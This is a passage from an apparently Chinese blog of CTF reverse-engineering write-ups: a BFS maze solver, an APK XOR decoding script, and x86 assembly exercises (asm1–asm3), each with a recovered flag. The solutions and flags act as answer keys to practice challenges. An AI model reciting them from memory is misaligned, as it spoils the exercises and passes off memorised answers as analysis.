class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        cout &lt;&lt; map2[i];</span><br><span class="line">        <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​然后就手动对着16x16的地图走一遍吧,懒得再整代码之类的了(太麻烦了吧)—更新:代码已整(见结尾部分↓)</p><p>​整理出来某段该死的路径(眼睛快瞎了):</p><p>​wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd</p><p>​在线md5出来:a8622109e2fb1296e06d5eed6f78f954</p><p>​记得外面是NSSCTF{}  <del>nnd试了半天才知道是这个格式才对,就不能说清楚</del></p><p>​flag: NSSCTF{a8622109e2fb1296e06d5eed6f78f954}</p><p>更新:走迷宫代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> map[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">R</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">&#125; pre[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="type">int</span> vis[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">R</span> destination;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    queue&lt;<span class="keyword">struct</span> R&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">    pre[x][y] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    vis[x][y] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">R</span> now = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span> (map[now.x][now.y] == <span class="number">-1</span>) &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            destination = now;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> x1 = now.x + dx[i];</span><br><span class="line">            <span class="type">int</span> y1 = now.y + dy[i];</span><br><span class="line">            <span class="keyword">if</span> (x1 &gt;= <span class="number">0</span> &amp;&amp; x1 &lt;= <span class="number">15</span> &amp;&amp; y1 &gt;= <span class="number">0</span> &amp;&amp; y1 &lt;= <span class="number">15</span> &amp;&amp; !vis[x1][y1] &amp;&amp; map[x1][y1] != <span class="number">1</span>) &#123;</span><br><span class="line">                vis[x1][y1] = <span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;x1, y1&#125;);</span><br><span class="line">                pre[x1][y1] = now;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_route</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">R</span> now = destination;</span><br><span class="line">    vector&lt;<span class="type">char</span>&gt; route;</span><br><span class="line">    <span class="keyword">while</span> (!(pre[now.x][now.y].x == <span class="number">-1</span> &amp;&amp; pre[now.x][now.y].y == <span class="number">-1</span>)) &#123;</span><br><span class="line">        <span class="type">int</span> sub_x = now.x - pre[now.x][now.y].x;</span><br><span class="line">        <span class="type">int</span> sub_y = now.y - pre[now.x][now.y].y;</span><br><span class="line">        <span class="keyword">if</span> (sub_x &lt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_y &lt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_x &gt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_y &gt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        now=pre[now.x][now.y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(route.<span class="built_in">begin</span>(), route.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i: route)</span><br><span class="line">        cout &lt;&lt; i;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">bfs</span>(<span class="number">15</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print_route</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​结束…</p><h2 id="easyapp"><a href="#easyapp" class="headerlink" title="easyapp"></a>easyapp</h2><p>​附件还挺花…没有zip后缀…</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728182839055.png" alt="image-20230728182839055" style="zoom:33%;" /></p><p>​加上然后解压出来个apk…继续整吧,不会java是真的麻烦…</p><p>​又是smail…看来得学学这玩意…</p><h3 id="第一部分—encoder类"><a href="#第一部分—encoder类" class="headerlink" title="第一部分—encoder类"></a>第一部分—encoder类</h3><p>​总之就是分析代码…首先发现main中对输入的字符串进行了encode方法的调用,也就是所我们先要去查看encoder类:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728200832325.png" alt="image-20230728200832325" style="zoom:50%;" /></p><p>​这里有个key的field(别问我这是什么…我没学过java…貌似是某种数据段)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728200946254.png" alt="image-20230728200946254" style="zoom:50%;" /></p><p>​而且赋初值为0x75bcd15,继续分析发现后续代码有一个逻辑上的映射变换</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728201437225.png" alt="image-20230728201437225" style="zoom:45%;" /></p><p>​这里是一个循环↑分析:</p><p>​53行:循环边界,判断v1是否大于0,是的话跳出</p><p>​55行:将p1的第v2个字符赋值给v3</p><p>​58行:获取key(p0是Encoder类)给v4</p><p>​60行:v3和v4异或(xor)</p><p>​61行:字面意思</p><p>​65行:append到字符串(v0?)</p><p>​67行:v2自增,准备进行下一次循环</p><p>​也就是说这里的字符串对key进行了异或映射</p><h3 id="第二部分—main继续分析"><a href="#第二部分—main继续分析" class="headerlink" title="第二部分—main继续分析"></a>第二部分—main继续分析</h3><p>​为什么有两个MainActivity.smail…….</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728202551209.png" alt="image-20230728202551209" style="zoom:33%;" /></p><p>​所以这里对key进行了重新赋值…我实在看不懂这东西的运行顺序…看WP看的这么个意思…</p><p>​总之就是要把p2和这个key进行异或运算然后就能出flag,p2就是这个(这个一看就懂):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728202753479.png" alt="image-20230728202753479" style="zoom:33%;" /></p><p>​那么我们另外写脚本吧,就用python吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">&quot;\u68ff\u68e2\u68e2\u68f2\u68e5\u68f7\u68ca\u68d0\u68c1\u68da\u68e8\u68e8\u68f5\u68e2\u68cc&quot;</span></span><br><span class="line">key = <span class="number">0x3ade68b1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) ^ key) &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#因为extend ascii字符是0x0-0xFF 但是unicode肯定是越界的, 所以这里要和0xff进行与操作来把最后结果限制到0x0-0xff</span></span><br><span class="line"><span class="comment">#运行脚本得到flag</span></span><br></pre></td></tr></table></figure><p>​这里因为对py不熟悉所以还是看了题解QWQ</p><p>​NSSCTF{apkYYDS}</p><p>​结束…(相当于把大佬的WP抄了一遍…)</p><h2 id="asm1"><a href="#asm1" class="headerlink" title="asm1"></a>asm1</h2><p>应该没有比我更闲的人了…这东西我还逆向出伪代码…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">asm1:</span><br><span class="line">&lt;+0&gt;:push   ebp              ; 将ebp寄存器的值保存到栈上</span><br><span class="line">&lt;+1&gt;:mov    ebp,esp         ; 将esp的值赋给ebp寄存器，建立新的栈帧</span><br><span class="line">&lt;+3&gt;:cmp    DWORD PTR [ebp+0x8],0x3a2   ; 比较ebp+0x8处的双字值与0x3a2</span><br><span class="line">&lt;+10&gt;:jg     0x512 &lt;asm1+37&gt;   ; 如果大于则跳转到地址0x512处继续执行</span><br><span class="line">&lt;+12&gt;:cmp    DWORD PTR [ebp+0x8],0x358   ; 否则，比较ebp+0x8处的双字值与0x358</span><br><span class="line">&lt;+19&gt;:jne    0x50a &lt;asm1+29&gt;   ; 如果不等于则跳转到地址0x50a处继续执行</span><br><span class="line">&lt;+21&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+24&gt;:add    eax,0x12        ; 将eax寄存器的值加上0x12</span><br><span class="line">&lt;+27&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+29&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+32&gt;:sub    eax,0x12        ; 将eax寄存器的值减去0x12</span><br><span class="line">&lt;+35&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+37&gt;:cmp    DWORD PTR [ebp+0x8],0x6fa   ; 比较ebp+0x8处的双字值与0x6fa</span><br><span class="line">&lt;+44&gt;:jne    0x523 &lt;asm1+54&gt;   ; 如果不等于则跳转到地址0x523处继续执行</span><br><span class="line">&lt;+46&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+49&gt;:sub    eax,0x12        ; 将eax寄存器的值减去0x12</span><br><span class="line">&lt;+52&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+54&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+57&gt;:add    eax,0x12        ; 将eax寄存器的值加上0x12</span><br><span class="line">&lt;+60&gt;:pop    ebp              ; 恢复栈帧，将栈顶指针赋给ebp寄存器</span><br><span class="line">&lt;+61&gt;:ret                    ; 返回</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来伪代码分析:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> &amp;k = [ebp+<span class="number">0x8</span>] <span class="comment">//写了个引用代表这个内存了哈哈哈</span></span><br><span class="line"><span class="keyword">if</span>(k&gt;<span class="number">0x3a2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(k!=<span class="number">0x6fa</span>)&#123;</span><br><span class="line">        ax=k</span><br><span class="line">        ax+=<span class="number">0x12</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ax=k</span><br><span class="line">        ax-=<span class="number">0x12</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(k!=<span class="number">0x358</span>)&#123;</span><br><span class="line">    ax=k</span><br><span class="line">    ax-=<span class="number">0x12</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ax=p</span><br><span class="line">    ax+=<span class="number">0x12</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注意返回值就是eax</span></span><br></pre></td></tr></table></figure><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731233248628.png" alt="image-20230731233248628" style="zoom:33%;" /></p><p>貌似是动态flag,我这里是0x6fa,所以结果就是0x6fa-0x12&#x3D;&#x3D;0x6e8</p><p>结束…</p><h2 id="asm2"><a href="#asm2" class="headerlink" title="asm2"></a>asm2</h2><p>也是看代码,这个题就是一个循环:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731235735960.png" alt="image-20230731235735960"></p><p>写解密代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0x21</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">0x2</span>;</span><br><span class="line">    <span class="keyword">while</span>(b&lt;=<span class="number">0xfb46</span>)&#123;</span><br><span class="line">        a+=<span class="number">1</span>;</span><br><span class="line">        b+=<span class="number">0x74</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#x&quot;</span>,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731235633534.png" alt="image-20230731235633534" style="zoom:33%;" /></p><p>结束…</p><h2 id="asm3"><a href="#asm3" class="headerlink" title="asm3"></a>asm3</h2><p>这道题试试用c调用汇编函数,首先在win下编译失败…</p><h3 id="ubuntu下编译环境的搭建"><a href="#ubuntu下编译环境的搭建" class="headerlink" title="ubuntu下编译环境的搭建"></a>ubuntu下编译环境的搭建</h3><p>然后转到ubuntu,在编译时报了一个错:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801091451315.png" alt="image-20230801091451315" style="zoom:33%;" /><p>百度后了解到是在x86_64直接编译32位程序报错,需要安装multilib库:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801091609808.png" alt="image-20230801091609808" style="zoom:33%;" /><p>真就是配环境配了半天…又得更新包索引…</p><h3 id="代码修改"><a href="#代码修改" class="headerlink" title="代码修改"></a>代码修改</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101549684.png" alt="image-20230801101549684" style="zoom:45%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101514580.png" alt="image-20230801101514580" style="zoom:50%;" /><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101445107.png" 